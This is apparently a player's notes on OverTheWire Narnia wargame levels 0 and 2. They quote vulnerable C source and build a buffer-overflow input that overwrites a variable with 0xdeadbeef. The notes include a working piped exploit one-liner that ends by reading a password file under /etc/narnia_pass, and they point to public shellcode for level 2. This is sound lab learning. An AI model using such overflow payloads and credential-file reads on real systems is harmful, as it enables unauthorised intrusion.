narnia0:narnia0

Level 0:


These give you the source code and execuatables in /narnia/narnia#.c
Running the exe we get:

Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: s
buf: s
val: 0x41414141
WAY OFF!!!!

Key things looking at this levels source code:

long val=0x41414141;
char buf[20];

scanf("%24s",&buf);

So we need to set val to 0xdeadbeef using a buffer overflow

Just spamming 0s we do see that it leaks into val

Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: 0000000000000000000000000
buf: 000000000000000000000000
val: 0x30303030

so it looks like the characters just need to be 0xdeadbeef past the 20 char buf

Converted deadbeef to utf8 

Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: 00000000000000000000ޭ��
buf: 00000000000000000000ޭ�
                          val: 0xbfefadde
WAY OFF!!!!


Looks to like I entered it backward damned little endian!

I couldn't enter it manually. The text encoding gets all messed up and passes the wrong value. 

Have to pipe it and then pass command to run after:

narnia0@gibson:/narnia$  { printf "00000000000000000000\xef\xbe\xad\xde\n" & sleep 0.1; echo "cat /etc/narnia_pass/narnia1"; } | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: 00000000000000000000ﾭ�
                                                val: 0xdeadbeef

Level 2: 


int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}


Looks like I have to put code in EGG env variable
It will be loaded as a function and run

Pull shellcode from here: https://www.exploit-db.com/shellcodes/13316
